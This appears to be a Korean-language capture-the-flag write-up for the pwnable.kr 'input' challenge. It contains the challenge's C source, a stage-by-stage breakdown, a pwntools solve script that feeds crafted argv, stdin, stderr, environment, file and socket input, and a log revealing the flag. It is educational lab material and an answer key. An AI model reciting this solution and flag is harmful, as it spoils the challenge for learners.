# input

## input.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

간단히 정리하면 아래와 같다.

```
Stage 1

argv[65] = '\x00'
argv[66] = '\x20\x0a\x0d'
```

```
Stage 2

stdin << '\x00\x0a\x00\xff'
stderr << '\x00\x0a\x02\xff'
```

```
Stage 3

env = {'\xde\xad\xbe\xef' : '\xca\xfe\xba\xbe'}
```

```
Stage 4

file name: '\x0a' 
contents : '\x00\x00\x00\x00'
```

```
Stage 5

port: argv[67]
contents: '\xde\xad\xbe\xef'
```

`stderr`는 따로 파일을 지정해 그 안에 값을 넣어두고, `0x0a` 파일도 따로 저장해뒀다. 

이를 위해 `/tmp`아래에 디렉토리를 만들고 `/home/input2/input`에 연결해서 `/bin/cat flag`를 못하기 때문에 심볼릭 링크로 연결해줬다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

argvs = [str(i) for i in range(100)]
argvs[65] = '\x00'
argvs[66] = '\x20\x0a\x0d'
argvs[67] = '49999'

input1 = '\x00\x0a\x00\xff'
input2 = '\x00\x0a\x02\xff'

envs={'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'}

fileName = '\x0a'
fileContents = '\x00\x00\x00\x00'

stage5 = '\xde\xad\xbe\xef'

with open(fileName, 'w') as fp:
    fp.write(fileContents)

with open('./stderr', 'w') as fp:
    fp.write(input2)

proc = process(executable='/home/input2/input', argv=argvs, env=envs, stderr=open('./stderr'))

proc.sendline(input1)
proc.recvuntil('Stage 4 clear!\n')

r = remote('localhost', int(argvs[67]))
r.send('\xde\xad\xbe\xef')
r.close()
proc.interactive()
```

```bash
[+] Starting local process '/home/input2/input' argv=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '', ' \n\r', '49999', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']  env={'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'} : Done
[DEBUG] Sent 0x5 bytes:
    00000000  00 0a 00 ff  0a                                     │····│·│
    00000005
[DEBUG] Received 0x92 bytes:
    'Welcome to pwnable.kr\n'
    "Let's see if you know how to give input to program\n"
    'Just give me correct inputs then you will get the flag :)\n'
    'Stage 1 clear!\n'
[DEBUG] Received 0xf bytes:
    'Stage 2 clear!\n'
[DEBUG] Received 0xf bytes:
    'Stage 3 clear!\n'
[DEBUG] Received 0xf bytes:
    'Stage 4 clear!\n'
[+] Opening connection to localhost on port 49999: Done
[DEBUG] Sent 0x4 bytes:
    00000000  de ad be ef                                         │····││
    00000004
[*] Closed connection to localhost port 49999
[*] Switching to interactive mode
[DEBUG] Received 0xf bytes:
    'Stage 5 clear!\n'
Stage 5 clear!
[DEBUG] Received 0x37 bytes:
    'Mommy! I learned how to pass various input in Linux :)\n'
Mommy! I learned how to pass various input in Linux :)
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[*] Process '/home/input2/input' stopped with exit code 0
[*] Got EOF while sending in interactive
```